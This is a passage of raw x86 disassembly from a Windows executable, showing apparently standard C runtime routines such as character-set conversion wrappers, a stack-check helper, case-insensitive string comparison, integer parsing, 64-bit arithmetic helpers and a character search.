  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
  426cd3:	call   DWORD PTR ds:0x428054
  426cd9:	mov    esi,eax
  426cdb:	cmp    esi,edi
  426cdd:	je     0x426d22
  426cdf:	push   esi
  426ce0:	push   0x1
  426ce2:	call   0x4249c8
  426ce7:	pop    ecx
  426ce8:	pop    ecx
  426ce9:	mov    DWORD PTR [ebp-0x20],eax
  426cec:	cmp    eax,edi
  426cee:	je     0x426d22
  426cf0:	push   edi
  426cf1:	push   edi
  426cf2:	push   esi
  426cf3:	push   eax
  426cf4:	push   esi
  426cf5:	push   ebx
  426cf6:	push   edi
  426cf7:	push   DWORD PTR [ebp+0xc]
  426cfa:	call   DWORD PTR ds:0x428054
  426d00:	cmp    eax,edi
  426d02:	jne    0x426d12
  426d04:	push   DWORD PTR [ebp-0x20]
  426d07:	call   0x4244ba
  426d0c:	pop    ecx
  426d0d:	mov    DWORD PTR [ebp-0x20],edi
  426d10:	jmp    0x426d22
  426d12:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  426d16:	je     0x426d22
  426d18:	mov    ecx,DWORD PTR [ebp+0x14]
  426d1b:	mov    DWORD PTR [ecx],eax
  426d1d:	jmp    0x426d22
  426d1f:	mov    ebx,DWORD PTR [ebp-0x48]
  426d22:	cmp    DWORD PTR [ebp-0x24],edi
  426d25:	je     0x426d2e
  426d27:	push   ebx
  426d28:	call   0x4244ba
  426d2d:	pop    ecx
  426d2e:	mov    eax,DWORD PTR [ebp-0x20]
  426d31:	lea    esp,[ebp-0x54]
  426d34:	mov    ecx,DWORD PTR [ebp-0x1c]
  426d37:	xor    ecx,DWORD PTR [ebp+0x4]
  426d3a:	call   0x423f7c
  426d3f:	call   0x4238e3
  426d44:	ret    
  426d45:	push   ebp
  426d46:	mov    ebp,esp
  426d48:	sub    esp,0x48
  426d4b:	push   ebx
  426d4c:	push   esi
  426d4d:	push   edi
  426d4e:	push   0x4
  426d50:	pop    eax
  426d51:	call   0x423900
  426d56:	mov    ebx,esp
  426d58:	push   0x1c
  426d5a:	lea    eax,[ebp-0x24]
  426d5d:	push   eax
  426d5e:	push   ebx
  426d5f:	call   DWORD PTR ds:0x4280f0
  426d65:	test   eax,eax
  426d67:	je     0x426dda
  426d69:	mov    edi,DWORD PTR [ebp-0x20]
  426d6c:	lea    eax,[ebp-0x48]
  426d6f:	push   eax
  426d70:	call   DWORD PTR ds:0x4280ec
  426d76:	mov    eax,DWORD PTR [ebp-0x44]
  426d79:	lea    esi,[eax-0x1]
  426d7c:	not    esi
  426d7e:	and    esi,ebx
  426d80:	sub    esi,eax
  426d82:	mov    DWORD PTR [ebp-0x4],eax
  426d85:	mov    eax,ds:0x45cac4
  426d8a:	mov    ecx,eax
  426d8c:	dec    ecx
  426d8d:	neg    ecx
  426d8f:	sbb    ecx,ecx
  426d91:	and    ecx,0xffff1000
  426d97:	add    ecx,0x11000
  426d9d:	add    ecx,edi
  426d9f:	cmp    esi,ecx
  426da1:	jb     0x426dda
  426da3:	cmp    eax,0x1
  426da6:	je     0x426df2
  426da8:	mov    ebx,edi
  426daa:	mov    edi,0x1000
  426daf:	push   0x1c
  426db1:	lea    eax,[ebp-0x24]
  426db4:	push   eax
  426db5:	push   ebx
  426db6:	call   DWORD PTR ds:0x4280f0
  426dbc:	test   eax,eax
  426dbe:	je     0x426dda
  426dc0:	add    ebx,DWORD PTR [ebp-0x18]
  426dc3:	test   DWORD PTR [ebp-0x14],edi
  426dc6:	je     0x426daf
  426dc8:	test   BYTE PTR [ebp-0xf],0x1
  426dcc:	mov    ebx,DWORD PTR [ebp-0x24]
  426dcf:	je     0x426dd6
  426dd1:	xor    eax,eax
  426dd3:	inc    eax
  426dd4:	jmp    0x426e0e
  426dd6:	cmp    esi,ebx
  426dd8:	jae    0x426dde
  426dda:	xor    eax,eax
  426ddc:	jmp    0x426e0e
  426dde:	push   0x4
  426de0:	push   edi
  426de1:	push   DWORD PTR [ebp-0x4]
  426de4:	push   ebx
  426de5:	call   DWORD PTR ds:0x4280b0
  426deb:	mov    eax,ds:0x45cac4
  426df0:	jmp    0x426df4
  426df2:	mov    ebx,esi
  426df4:	dec    eax
  426df5:	neg    eax
  426df7:	sbb    eax,eax
  426df9:	and    eax,0x103
  426dfe:	lea    ecx,[ebp-0x8]
  426e01:	push   ecx
  426e02:	inc    eax
  426e03:	push   eax
  426e04:	push   DWORD PTR [ebp-0x4]
  426e07:	push   ebx
  426e08:	call   DWORD PTR ds:0x4280e8
  426e0e:	lea    esp,[ebp-0x54]
  426e11:	pop    edi
  426e12:	pop    esi
  426e13:	pop    ebx
  426e14:	leave  
  426e15:	ret    
  426e16:	int3   
  426e17:	int3   
  426e18:	int3   
  426e19:	int3   
  426e1a:	int3   
  426e1b:	int3   
  426e1c:	int3   
  426e1d:	int3   
  426e1e:	int3   
  426e1f:	int3   
  426e20:	push   ebp
  426e21:	mov    ebp,esp
  426e23:	push   edi
  426e24:	push   esi
  426e25:	push   ebx
  426e26:	mov    esi,DWORD PTR [ebp+0xc]
  426e29:	mov    edi,DWORD PTR [ebp+0x8]
  426e2c:	mov    al,0xff
  426e2e:	mov    edi,edi
  426e30:	or     al,al
  426e32:	je     0x426e66
  426e34:	mov    al,BYTE PTR [esi]
  426e36:	add    esi,0x1
  426e39:	mov    ah,BYTE PTR [edi]
  426e3b:	add    edi,0x1
  426e3e:	cmp    ah,al
  426e40:	je     0x426e30
  426e42:	sub    al,0x41
  426e44:	cmp    al,0x1a
  426e46:	sbb    cl,cl
  426e48:	and    cl,0x20
  426e4b:	add    al,cl
  426e4d:	add    al,0x41
  426e4f:	xchg   al,ah
  426e51:	sub    al,0x41
  426e53:	cmp    al,0x1a
  426e55:	sbb    cl,cl
  426e57:	and    cl,0x20
  426e5a:	add    al,cl
  426e5c:	add    al,0x41
  426e5e:	cmp    al,ah
  426e60:	je     0x426e30
  426e62:	sbb    al,al
  426e64:	sbb    al,0xff
  426e66:	movsx  eax,al
  426e69:	pop    ebx
  426e6a:	pop    esi
  426e6b:	pop    edi
  426e6c:	leave  
  426e6d:	ret    
  426e6e:	push   esi
  426e6f:	push   edi
  426e70:	call   0x42375d
  426e75:	mov    edi,DWORD PTR [eax+0x64]
  426e78:	cmp    edi,DWORD PTR ds:0x45c58c
  426e7e:	je     0x426e87
  426e80:	call   0x424c0f
  426e85:	mov    edi,eax
  426e87:	mov    esi,DWORD PTR [esp+0xc]
  426e8b:	cmp    DWORD PTR [edi+0x28],0x1
  426e8f:	movzx  eax,BYTE PTR [esi]
  426e92:	jle    0x426ea2
  426e94:	push   0x8
  426e96:	push   eax
  426e97:	push   edi
  426e98:	call   0x426ef6
  426e9d:	add    esp,0xc
  426ea0:	jmp    0x426eac
  426ea2:	mov    ecx,DWORD PTR [edi+0x48]
  426ea5:	movzx  eax,BYTE PTR [ecx+eax*2]
  426ea9:	and    eax,0x8
  426eac:	test   eax,eax
  426eae:	je     0x426eb3
  426eb0:	inc    esi
  426eb1:	jmp    0x426e8b
  426eb3:	movzx  ecx,BYTE PTR [esi]
  426eb6:	inc    esi
  426eb7:	cmp    ecx,0x2d
  426eba:	mov    edx,ecx
  426ebc:	je     0x426ec3
  426ebe:	cmp    ecx,0x2b
  426ec1:	jne    0x426ec7
  426ec3:	movzx  ecx,BYTE PTR [esi]
  426ec6:	inc    esi
  426ec7:	xor    eax,eax
  426ec9:	cmp    ecx,0x30
  426ecc:	jl     0x426ed8
  426ece:	cmp    ecx,0x39
  426ed1:	jg     0x426ed8
  426ed3:	sub    ecx,0x30
  426ed6:	jmp    0x426edb
  426ed8:	or     ecx,0xffffffff
  426edb:	cmp    ecx,0xffffffff
  426ede:	je     0x426eec
  426ee0:	lea    eax,[eax+eax*4]
  426ee3:	lea    eax,[ecx+eax*2]
  426ee6:	movzx  ecx,BYTE PTR [esi]
  426ee9:	inc    esi
  426eea:	jmp    0x426ec9
  426eec:	cmp    edx,0x2d
  426eef:	pop    edi
  426ef0:	pop    esi
  426ef1:	jne    0x426ef5
  426ef3:	neg    eax
  426ef5:	ret    
  426ef6:	push   ebp
  426ef7:	mov    ebp,esp
  426ef9:	push   ecx
  426efa:	mov    eax,DWORD PTR [ebp+0xc]
  426efd:	lea    ecx,[eax+0x1]
  426f00:	cmp    ecx,0x100
  426f06:	mov    ecx,DWORD PTR [ebp+0x8]
  426f09:	ja     0x426f14
  426f0b:	mov    ecx,DWORD PTR [ecx+0x48]
  426f0e:	movzx  eax,WORD PTR [ecx+eax*2]
  426f12:	jmp    0x426f68
  426f14:	push   esi
  426f15:	mov    edx,eax
  426f17:	sar    edx,0x8
  426f1a:	push   edi
  426f1b:	mov    edi,DWORD PTR [ecx+0x48]
  426f1e:	movzx  esi,dl
  426f21:	test   BYTE PTR [edi+esi*2+0x1],0x80
  426f26:	pop    edi
  426f27:	pop    esi
  426f28:	je     0x426f39
  426f2a:	and    BYTE PTR [ebp-0x2],0x0
  426f2e:	push   0x2
  426f30:	mov    BYTE PTR [ebp-0x3],al
  426f33:	mov    BYTE PTR [ebp-0x4],dl
  426f36:	pop    eax
  426f37:	jmp    0x426f43
  426f39:	and    BYTE PTR [ebp-0x3],0x0
  426f3d:	mov    BYTE PTR [ebp-0x4],al
  426f40:	xor    eax,eax
  426f42:	inc    eax
  426f43:	push   0x1
  426f45:	push   DWORD PTR [ecx+0x14]
  426f48:	push   DWORD PTR [ecx+0x4]
  426f4b:	lea    ecx,[ebp+0xe]
  426f4e:	push   ecx
  426f4f:	push   eax
  426f50:	lea    eax,[ebp-0x4]
  426f53:	push   eax
  426f54:	push   0x1
  426f56:	call   0x425fd8
  426f5b:	add    esp,0x1c
  426f5e:	test   eax,eax
  426f60:	jne    0x426f64
  426f62:	leave  
  426f63:	ret    
  426f64:	movzx  eax,WORD PTR [ebp+0xe]
  426f68:	and    eax,DWORD PTR [ebp+0x10]
  426f6b:	leave  
  426f6c:	ret    
  426f6d:	int3   
  426f6e:	int3   
  426f6f:	int3   
  426f70:	mov    eax,DWORD PTR [esp+0x8]
  426f74:	mov    ecx,DWORD PTR [esp+0x10]
  426f78:	or     ecx,eax
  426f7a:	mov    ecx,DWORD PTR [esp+0xc]
  426f7e:	jne    0x426f89
  426f80:	mov    eax,DWORD PTR [esp+0x4]
  426f84:	mul    ecx
  426f86:	ret    0x10
  426f89:	push   ebx
  426f8a:	mul    ecx
  426f8c:	mov    ebx,eax
  426f8e:	mov    eax,DWORD PTR [esp+0x8]
  426f92:	mul    DWORD PTR [esp+0x14]
  426f96:	add    ebx,eax
  426f98:	mov    eax,DWORD PTR [esp+0x8]
  426f9c:	mul    ecx
  426f9e:	add    edx,ebx
  426fa0:	pop    ebx
  426fa1:	ret    0x10
  426fa4:	int3   
  426fa5:	int3   
  426fa6:	int3   
  426fa7:	int3   
  426fa8:	int3   
  426fa9:	int3   
  426faa:	int3   
  426fab:	int3   
  426fac:	int3   
  426fad:	int3   
  426fae:	int3   
  426faf:	int3   
  426fb0:	push   ebp
  426fb1:	mov    ebp,esp
  426fb3:	push   edi
  426fb4:	push   esi
  426fb5:	push   ebx
  426fb6:	mov    ecx,DWORD PTR [ebp+0x10]
  426fb9:	or     ecx,ecx
  426fbb:	je     0x42700a
  426fbd:	mov    esi,DWORD PTR [ebp+0x8]
  426fc0:	mov    edi,DWORD PTR [ebp+0xc]
  426fc3:	mov    bh,0x41
  426fc5:	mov    bl,0x5a
  426fc7:	mov    dh,0x20
  426fc9:	lea    ecx,[ecx+0x0]
  426fcc:	mov    ah,BYTE PTR [esi]
  426fce:	or     ah,ah
  426fd0:	mov    al,BYTE PTR [edi]
  426fd2:	je     0x426ffb
  426fd4:	or     al,al
  426fd6:	je     0x426ffb
  426fd8:	add    esi,0x1
  426fdb:	add    edi,0x1
  426fde:	cmp    ah,bh
  426fe0:	jb     0x426fe8
  426fe2:	cmp    ah,bl
  426fe4:	ja     0x426fe8
  426fe6:	add    ah,dh
  426fe8:	cmp    al,bh
  426fea:	jb     0x426ff2
  426fec:	cmp    al,bl
  426fee:	ja     0x426ff2
  426ff0:	add    al,dh
  426ff2:	cmp    ah,al
  426ff4:	jne    0x427001
  426ff6:	sub    ecx,0x1
  426ff9:	jne    0x426fcc
  426ffb:	xor    ecx,ecx
  426ffd:	cmp    ah,al
  426fff:	je     0x42700a
  427001:	mov    ecx,0xffffffff
  427006:	jb     0x42700a
  427008:	neg    ecx
  42700a:	mov    eax,ecx
  42700c:	pop    ebx
  42700d:	pop    esi
  42700e:	pop    edi
  42700f:	leave  
  427010:	ret    
  427011:	int3   
  427012:	int3   
  427013:	int3   
  427014:	int3   
  427015:	int3   
  427016:	int3   
  427017:	int3   
  427018:	int3   
  427019:	int3   
  42701a:	int3   
  42701b:	int3   
  42701c:	int3   
  42701d:	int3   
  42701e:	int3   
  42701f:	int3   
  427020:	push   esi
  427021:	mov    eax,DWORD PTR [esp+0x14]
  427025:	or     eax,eax
  427027:	jne    0x427051
  427029:	mov    ecx,DWORD PTR [esp+0x10]
  42702d:	mov    eax,DWORD PTR [esp+0xc]
  427031:	xor    edx,edx
  427033:	div    ecx
  427035:	mov    ebx,eax
  427037:	mov    eax,DWORD PTR [esp+0x8]
  42703b:	div    ecx
  42703d:	mov    esi,eax
  42703f:	mov    eax,ebx
  427041:	mul    DWORD PTR [esp+0x10]
  427045:	mov    ecx,eax
  427047:	mov    eax,esi
  427049:	mul    DWORD PTR [esp+0x10]
  42704d:	add    edx,ecx
  42704f:	jmp    0x427098
  427051:	mov    ecx,eax
  427053:	mov    ebx,DWORD PTR [esp+0x10]
  427057:	mov    edx,DWORD PTR [esp+0xc]
  42705b:	mov    eax,DWORD PTR [esp+0x8]
  42705f:	shr    ecx,1
  427061:	rcr    ebx,1
  427063:	shr    edx,1
  427065:	rcr    eax,1
  427067:	or     ecx,ecx
  427069:	jne    0x42705f
  42706b:	div    ebx
  42706d:	mov    esi,eax
  42706f:	mul    DWORD PTR [esp+0x14]
  427073:	mov    ecx,eax
  427075:	mov    eax,DWORD PTR [esp+0x10]
  427079:	mul    esi
  42707b:	add    edx,ecx
  42707d:	jb     0x42708d
  42707f:	cmp    edx,DWORD PTR [esp+0xc]
  427083:	ja     0x42708d
  427085:	jb     0x427096
  427087:	cmp    eax,DWORD PTR [esp+0x8]
  42708b:	jbe    0x427096
  42708d:	dec    esi
  42708e:	sub    eax,DWORD PTR [esp+0x10]
  427092:	sbb    edx,DWORD PTR [esp+0x14]
  427096:	xor    ebx,ebx
  427098:	sub    eax,DWORD PTR [esp+0x8]
  42709c:	sbb    edx,DWORD PTR [esp+0xc]
  4270a0:	neg    edx
  4270a2:	neg    eax
  4270a4:	sbb    edx,0x0
  4270a7:	mov    ecx,edx
  4270a9:	mov    edx,ebx
  4270ab:	mov    ebx,ecx
  4270ad:	mov    ecx,eax
  4270af:	mov    eax,esi
  4270b1:	pop    esi
  4270b2:	ret    0x10
  4270b5:	int3   
  4270b6:	int3   
  4270b7:	int3   
  4270b8:	int3   
  4270b9:	int3   
  4270ba:	int3   
  4270bb:	int3   
  4270bc:	int3   
  4270bd:	int3   
  4270be:	int3   
  4270bf:	int3   
  4270c0:	lea    eax,[edx-0x1]
  4270c3:	pop    ebx
  4270c4:	ret    
  4270c5:	lea    esp,[esp+0x0]
  4270cc:	lea    esp,[esp+0x0]
  4270d0:	xor    eax,eax
  4270d2:	mov    al,BYTE PTR [esp+0x8]
  4270d6:	push   ebx
  4270d7:	mov    ebx,eax
  4270d9:	shl    eax,0x8
  4270dc:	mov    edx,DWORD PTR [esp+0x8]
  4270e0:	test   edx,0x3
  4270e6:	je     0x4270fd
  4270e8:	mov    cl,BYTE PTR [edx]
  4270ea:	add    edx,0x1
  4270ed:	cmp    cl,bl
  4270ef:	je     0x4270c0
  4270f1:	test   cl,cl
  4270f3:	je     0x427146
  4270f5:	test   edx,0x3
  4270fb:	jne    0x4270e8
  4270fd:	or     ebx,eax
  4270ff:	push   edi
  427100:	mov    eax,ebx
  427102:	shl    ebx,0x10
  427105:	push   esi
  427106:	or     ebx,eax
  427108:	mov    ecx,DWORD PTR [edx]
  42710a:	mov    edi,0x7efefeff
  42710f:	mov    eax,ecx
  427111:	mov    esi,edi
  427113:	xor    ecx,ebx
  427115:	add    esi,eax
  427117:	add    edi,ecx
  427119:	xor    ecx,0xffffffff
  42711c:	xor    eax,0xffffffff
  42711f:	xor    ecx,edi
  427121:	xor    eax,esi
  427123:	add    edx,0x4
  427126:	and    ecx,0x81010100
  42712c:	jne    0x42714a
  42712e:	and    eax,0x81010100
  427133:	je     0x427108
  427135:	and    eax,0x1010100
  42713a:	jne    0x427144
  42713c:	and    esi,0x80000000
  427142:	jne    0x427108
  427144:	pop    esi
  427145:	pop    edi
  427146:	pop    ebx
  427147:	xor    eax,eax
  427149:	ret    
  42714a:	mov    eax,DWORD PTR [edx-0x4]
  42714d:	cmp    al,bl
  42714f:	je     0x427187
  427151:	test   al,al
  427153:	je     0x427144
  427155:	cmp    ah,bl
  427157:	je     0x427180
  427159:	test   ah,ah
  42715b:	je     0x427144
  42715d:	shr    eax,0x10
  427160:	cmp    al,bl
  427162:	je     0x427179
  427164:	test   al,al
  427166:	je     0x427144
  427168:	cmp    ah,bl
  42716a:	je     0x427172
  42716c:	test   ah,ah
  42716e:	je     0x427144
  427170:	jmp    0x427108
  427172:	pop    esi
  427173:	pop    edi
  427174:	lea    eax,[edx-0x1]
  427177:	pop    ebx
  427178:	ret    
  427179:	lea    eax,[edx-0x2]
  42717c:	pop    esi
  42717d:	pop    edi
  42717e:	pop    ebx
  42717f:	ret    
  427180:	lea    eax,[edx-0x3]
  427183:	pop    esi
  427184:	pop    edi
  427185:	pop    ebx
  427186:	ret    
  427187:	lea    eax,[edx-0x4]
  42718a:	pop    esi
  42718b:	pop    edi
  42718c:	pop    ebx
  42718d:	ret    
  42718e:	jmp    DWORD PTR ds:0x4280e4
